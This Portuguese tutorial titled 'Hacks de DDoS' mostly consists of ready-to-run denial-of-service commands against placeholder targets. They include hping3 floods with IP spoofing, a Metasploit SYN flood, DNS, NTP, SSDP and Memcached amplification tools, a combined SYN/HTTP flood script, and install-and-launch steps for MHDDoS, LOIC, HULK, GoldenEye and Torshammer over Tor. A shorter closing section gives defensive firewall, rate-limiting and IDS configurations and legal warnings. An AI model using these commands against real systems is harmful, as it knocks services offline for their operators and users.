Hacks de DDoS

AVISO IMPORTANTE: Este conteúdo é fornecido APENAS para fins educacionais. A execução de ataques DDoS sem autorização explícita é ILEGAL em praticamente todos os países e pode resultar em processos criminais. Utilize estes conhecimentos apenas em ambientes controlados e com as devidas autorizações.

O que é um ataque DDoS?

DDoS (Distributed Denial of Service) é um tipo de ataque cibernético que visa tornar um serviço, site ou rede indisponível, sobrecarregando-o com tráfego malicioso proveniente de múltiplas fontes.

Ao contrário de um ataque DoS (Denial of Service) simples, que utiliza uma única fonte para gerar tráfego, ataques DDoS empregam múltiplos sistemas comprometidos (geralmente uma botnet) para amplificar significativamente a potência do ataque.

Anatomia de um ataque DDoS
hacker@cyberhack:~$ echo "Anatomia de um ataque DDoS"
Anatomia de um ataque DDoS
hacker@cyberhack:~$ cat ddos_components.txt
1. Atacante (Controla a botnet) 2. Botnet (Rede de dispositivos comprometidos) 3. Amplificadores (Servidores que multiplicam o tráfego) 4. Vítima (Alvo do ataque) 5. Métodos de Ataque (Layer 3/4, Layer 7, etc.)
hacker@cyberhack:~$ cat ddos_impact.txt
- Indisponibilidade de serviços - Saturação de banda - Esgotamento de recursos (CPU, memória, etc.) - Falha de sistemas de firewall e balanceadores - Danos à reputação e perdas financeiras
hacker@cyberhack:~$ _

Os ataques DDoS modernos podem atingir volumes impressionantes, com alguns dos maiores ataques registrados superando 2 Tbps (Terabits por segundo) de tráfego, o suficiente para derrubar praticamente qualquer infraestrutura não preparada.

Tipos de Ataques DDoS

Os ataques DDoS podem ser classificados em diferentes categorias, cada um com características e métodos específicos.

Ataques Volumétricos

Visam consumir toda a largura de banda disponível entre a vítima e a internet, saturando a rede com tráfego aparentemente legítimo.

UDP Flood

Envia um grande número de pacotes UDP para portas aleatórias no servidor alvo, forçando-o a verificar aplicações nas portas e responder com pacotes ICMP "Destination Unreachable" quando nenhuma aplicação é encontrada.

hping3 --udp -p 53 --flood -d 1000 [IP-ALVO]

Este comando utiliza a ferramenta hping3 para gerar um flood UDP direcionado à porta 53 (DNS) com pacotes de 1000 bytes.

ICMP Flood (Ping Flood)

Sobrecarrega o alvo com pacotes ICMP Echo Request (ping), consumindo largura de banda e recursos de processamento.

hping3 --icmp --flood -d 1500 [IP-ALVO]

Este comando gera um flood de pacotes ICMP com tamanho de 1500 bytes para o alvo.

Ataques de Protocolo

Exploram vulnerabilidades em protocolos de rede, consumindo recursos de servidores ou equipamentos intermediários como firewalls e balanceadores.

SYN Flood

Envia um grande número de pacotes TCP SYN, mas não responde aos SYN-ACK, deixando conexões "meio-abertas" que consomem recursos do servidor.

hping3 -S --flood -V -p 80 [IP-ALVO]

Este comando realiza um SYN flood na porta 80 (HTTP) com visualização detalhada (-V).

msfconsole -q
use auxiliary/dos/tcp/synflood
set RHOST [IP-ALVO]
set RPORT 443
set SHOST [IP-SPOOFADO]
run

Este script do Metasploit executa um ataque SYN Flood mais sofisticado com spoofing de IP.

TCP Fragmentation

Envia pacotes TCP fragmentados que a vítima precisa remontar, consumindo recursos de memória e processamento.

hping3 --flood -f -p 80 [IP-ALVO]

O parâmetro -f fragmenta os pacotes enviados ao alvo.

Ataques de Camada de Aplicação

Miram vulnerabilidades específicas em aplicativos web ou servidores, utilizando requisições aparentemente legítimas mas em volumes anormais.

HTTP/HTTPS Flood

Bombardeia o servidor web com um grande número de requisições GET ou POST legítimas, esgotando sua capacidade de processamento.

ab -n 1000000 -c 1000 http://[SITE-ALVO]/

Apache Benchmark (ab) realiza 1 milhão de requisições com 1000 conexões concorrentes.

wrk -t10 -c500 -d60s http://[SITE-ALVO]/

Utiliza a ferramenta wrk com 10 threads, 500 conexões simultâneas por 60 segundos.

python3 slowloris.py [SITE-ALVO] -s 1000 -v

Slowloris é um ataque que mantém conexões HTTP abertas por longos períodos. Este comando abre 1000 sockets simultâneos.

Slow HTTP Attacks

Estabelece conexões HTTP com o servidor alvo e envia dados muito lentamente, mantendo as conexões abertas por longos períodos.

slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://[SITE-ALVO]/ -x 24 -p 3

Este comando executa um ataque Slow Headers com 1000 conexões, aumentando em 200 por segundo.

Ataques de Amplificação/Reflexão

Exploram serviços que produzem respostas maiores que as requisições, amplificando o volume do ataque, frequentemente com IP falsificado (spoofed).

DNS Amplification

Envia consultas DNS com IP de origem falsificado para servidores DNS recursivos abertos, gerando respostas muito maiores que são enviadas à vítima.

dnsdrdos -s [IP-SPOOFADO] -t [IP-ALVO] -d dominio.com -l dns_servers.txt

Esta ferramenta automatiza ataques de amplificação DNS, utilizando uma lista de servidores DNS abertos.

NTP Amplification

Explora o comando monlist do protocolo NTP, que pode gerar respostas até 556 vezes maiores que a consulta original.

ntpdos.py -t [IP-ALVO] -l ntp_servers.txt

Este script Python explora servidores NTP vulneráveis para realizar ataques de amplificação.

SSDP Amplification

Utiliza dispositivos compatíveis com SSDP (Simple Service Discovery Protocol) para gerar respostas amplificadas.

saddam -t [IP-ALVO] -f ssdp.txt

Saddam é uma ferramenta para realizar ataques de amplificação SSDP, Memcached e outros.

Memcached Amplification

Um dos ataques de amplificação mais potentes, com fator de amplificação de até 51.000x, explorando servidores Memcached expostos.

sudo python3 memcached.py [IP-SPOOFADO] [IP-ALVO] [PORTA-ALVO] [LISTA-SERVIDORES] [NÚMERO-THREADS]

Este script Python explora servidores Memcached vulneráveis para executar ataques massivos.

Ataques Híbridos e Multi-Vetor

Combinam múltiplas técnicas de ataque simultaneamente, dificultando a mitigação por usar diferentes vetores.

Multi-vetorial com MHDDoS

MHDDoS é uma ferramenta avançada que permite ataques DDoS multi-vetor, combinando diferentes técnicas.

git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt
python3 start.py TCP [IP-ALVO] [PORTA] 8 1024 socks5.txt 100 100

Este exemplo utiliza ataque TCP com 8 threads, 1024 bytes por pacote, lista de proxies SOCKS5, 100 conexões por proxy e 100 segundos de duração.

Combinação de Layer 4 e 7

Ferramentas modernas permitem combinar ataques de camada de rede/transporte (Layer 4) com ataques de aplicação (Layer 7).

# Script combinando SYN Flood e HTTP Flood
#!/bin/bash
# Inicia SYN Flood em background
hping3 -S --flood -p 80 [IP-ALVO] &
SYN_PID=$!
# Inicia HTTP Flood
ab -n 1000000 -c 1000 http://[SITE-ALVO]/
# Encerra SYN Flood
kill $SYN_PID

Este script shell combina um ataque SYN Flood (Layer 4) com HTTP Flood (Layer 7) para maior eficácia.

Ferramentas Avançadas de DDoS

Existem diversas ferramentas disponíveis para testes de resistência a ataques DDoS. Lembre-se que o uso destas ferramentas deve ser restrito a ambientes controlados e com as devidas autorizações.

LOIC (Low Orbit Ion Cannon)

Uma ferramenta de estresse de rede que realiza ataques DoS através de inundação de pacotes UDP, TCP ou HTTP. Foi popularizada pelo grupo Anonymous.

  • Interface gráfica simples
  • Suporte a ataques TCP, UDP e HTTP
  • Permite controle sobre threads e velocidade
  • Modo "IMMA CHARGIN MAH LAZER" para ataques máximos
# Instalação no Kali Linux
apt-get install mono-complete
wget https://github.com/NewEraCracker/LOIC/releases/download/1.0.8/LOIC_1.0.8.0_binary.zip
unzip LOIC_1.0.8.0_binary.zip
mono LOIC.exe
# Comando para ataque via linha de comando
mono LOIC.exe /target:[SITE-ALVO] /port:80 /method:HTTP /threads:100

HOIC (High Orbit Ion Cannon)

Sucessora da LOIC, focada em ataques HTTP POST/GET com capacidade de contornar defesas comuns usando "boosters" personalizáveis.

  • Suporte a até 256 threads simultâneos
  • Scripts personalizáveis (boosters) para evasão de defesas
  • Ataques HTTP mais sofisticados
  • Suporte a múltiplos alvos simultâneos

HULK (HTTP Unbearable Load King)

Ferramenta especializada em ataques de Layer 7 (HTTP) que gera tráfego altamente ofuscado e difícil de filtrar, evitando métodos de defesa comuns.

  • Geração de URLs aleatórias para evitar cache
  • User-Agents aleatórios
  • Referrers aleatórios
  • Evita cookies/fingerprinting
  • Mantém conexões vivas
# Download e instalação
git clone https://github.com/grafov/hulk
cd hulk
python hulk.py http://[SITE-ALVO]/
# Versão Go (mais potente)
git clone https://github.com/grafov/hulk-1
cd hulk-1
go build hulk.go
./hulk -site http://[SITE-ALVO]/ -agents 100

Slowloris

Ataque de negação de serviço que utiliza um número mínimo de recursos para derrubar servidores web, mantendo conexões HTTP abertas por longos períodos.

  • Ataque "low and slow" (baixo e lento)
  • Eficaz contra Apache, nginx (configurações padrão)
  • Difícil de detectar em logs tradicionais
  • Requer poucos recursos do atacante
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py [SITE-ALVO] -p 80 -s 500 -v
# Opções importantes:
-p [PORT]      - Porta alvo (padrão: 80)
-s [SOCKETS]   - Número de sockets (padrão: 150)
-v             - Modo verboso
-ua            - Rotação de User-Agent
--https        - Usar HTTPS
--proxy        - Usar proxy (formato: host:porta)

GoldenEye

Ferramenta de teste de resistência HTTP DoS baseada em ataques Keep-Alive + No-Cache, desenhada para testar resistência de aplicações web.

  • Baseado no conceito do Slowloris, mas mais agressivo
  • Utiliza técnicas de keepalive e cabeçalhos aleatórios
  • Suporte a HTTPS
  • Gerador de tráfego aleatório
git clone https://github.com/jseidl/GoldenEye.git
cd GoldenEye
chmod +x goldeneye.py
./goldeneye.py http://[SITE-ALVO]/ -w 50 -s 100 -m random
# Opções principais:
-u / --useragents      - Arquivo com user agents
-w / --workers         - Número de workers concorrentes
-s / --sockets         - Número de sockets por worker
-m / --method          - Método HTTP (get, head, post, random)
-d / --debug           - Modo de debug
-h / --help            - Ajuda

Hping3

Ferramenta avançada de linha de comando para análise e geração de pacotes TCP/IP, amplamente utilizada para testes de firewall e ataques DoS.

  • Suporte a TCP, UDP, ICMP e pacotes RAW-IP
  • Modo flood para ataques DoS
  • Capacidade de spoofing de IP
  • Fragmentação de pacotes
  • Controle preciso sobre parâmetros de pacotes
# Instalação
apt-get install hping3
# SYN Flood
hping3 -S --flood -V -p 80 [IP-ALVO]
# SYN Flood com IP Spoofing (IP aleatório)
hping3 -S --flood -V -p 80 -a 0.0.0.0 --rand-source [IP-ALVO]
# ICMP Flood
hping3 --icmp --flood -V [IP-ALVO]
# UDP Flood
hping3 --udp --flood -V -p 53 [IP-ALVO]
# ACK Flood
hping3 -A --flood -V -p 80 [IP-ALVO]

Torshammer

Ferramenta de ataque DoS de camada 7 (aplicação) que utiliza a rede Tor para anonimizar os ataques, tornando mais difícil o bloqueio por IP.

  • Utiliza a rede Tor para anonimato
  • Ataque HTTP POST com alto uso de recursos
  • Eficiente mesmo com poucos recursos
  • Pode contornar sistemas WAF comuns
git clone https://github.com/dotfighter/torshammer.git
cd torshammer
python2 torshammer.py -t [SITE-ALVO] -r 500
# Opções principais:
-t / --target       - Alvo (URL ou IP)
-r / --threads      - Número de threads (padrão: 256)
-p / --port         - Porta destino (padrão: 80)
-T / --tor          - Usar rede Tor (necessita proxy Tor)
-h / --help         - Ajuda

Defesa Contra Ataques DDoS

Compreender as técnicas de DDoS é fundamental para desenvolver estratégias de defesa eficazes. Abaixo estão algumas das principais técnicas de mitigação.

Filtragem de Tráfego

Implementação de filtros de tráfego para identificar e bloquear pacotes maliciosos antes que cheguem ao servidor alvo.

# Bloqueio de pacotes SYN em massa com iptables
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
# Limitação de conexões ICMP (proteção contra ping flood)
iptables -A INPUT -p icmp -m limit --limit 1/s --limit-burst 4 -j ACCEPT
iptables -A INPUT -p icmp -j DROP

Aumento de Capacidade

Aumento da largura de banda, distribuição de carga e redundância de servidores para absorver o impacto de ataques volumétricos.

# Configuração Nginx para balanceamento de carga
http {
    upstream backend {
        server backend1.example.com;
        server backend2.example.com;
        server backend3.example.com;
    }

    server {
        listen 80;
        server_name example.com;

        location / {
            proxy_pass http://backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}

Rate Limiting

Implementação de limites de taxa para restringir o número de requisições de um único IP ou rede em um período de tempo.

# Rate limiting no Nginx
http {
    limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
    
    server {
        location /login/ {
            limit_req zone=one burst=5;
            # ...
        }
    }
}
# Rate limiting no Apache (mod_evasive)
<IfModule mod_evasive20.c>
    DOSHashTableSize 3097
    DOSPageCount 2
    DOSSiteCount 50
    DOSPageInterval 1
    DOSSiteInterval 1
    DOSBlockingPeriod 10
    DOSEmailNotify admin@example.com
</IfModule>

Serviços Anti-DDoS

Utilização de serviços especializados como Cloudflare, AWS Shield, Akamai, ou Imperva para mitigação de ataques DDoS.

Estes serviços utilizam redes globais de datacenters para absorver ataques volumétricos, filtrar tráfego malicioso e permitir apenas tráfego legítimo ao servidor de origem.

# Exemplo de regra Cloudflare Firewall
# Bloqueia IPs que fazem mais de 100 requisições em 1 minuto
(http.request.uri.path eq "/wp-login.php" and ip.src ne 192.0.2.1)
and (http.request.rate.count gt 100 and http.request.rate.period eq 60)

Análise de Tráfego Anômalo

Implementação de sistemas de detecção de intrusão (IDS) e sistemas de prevenção de intrusão (IPS) para identificar e bloquear padrões de tráfego suspeito.

# Instalação do Suricata IDS/IPS
apt-get install suricata
suricata -c /etc/suricata/suricata.yaml -i eth0
# Regra Suricata para detectar SYN Flood
alert tcp any any -> $HOME_NET any (msg:"Possível SYN Flood"; 
flow:stateless; flags:S; threshold:type threshold, track by_dst, 
count 1000, seconds 5; sid:10001; rev:1;)

Aspectos Legais e Éticos

A realização de ataques DDoS sem autorização é ilegal na maioria dos países e pode resultar em consequências legais graves.

AVISO LEGAL: No Brasil, ataques DDoS não autorizados podem ser enquadrados nos artigos 266 e 267 da Lei 12.737/2012 (Lei Carolina Dieckmann), com penas que podem chegar a 5 anos de reclusão.

  • Realize testes de DDoS apenas em infraestrutura sob sua responsabilidade ou com autorização explícita por escrito
  • Jamais utilize ferramentas de DDoS contra sites governamentais, serviços essenciais ou infraestrutura crítica
  • Prefira ambientes de laboratório isolados para testes
  • Mantenha registros detalhados de todas as autorizações e testes realizados
  • Utilize ferramentas como o DosTester que são específicas para testes controlados

    • USO ÉTICO: O conhecimento sobre ataques DDoS deve ser aplicado para fortalecer defesas, realizar testes de resistência autorizados e melhorar a segurança de sistemas. Profissionais éticos contribuem para a proteção da internet, não para sua disrupção.
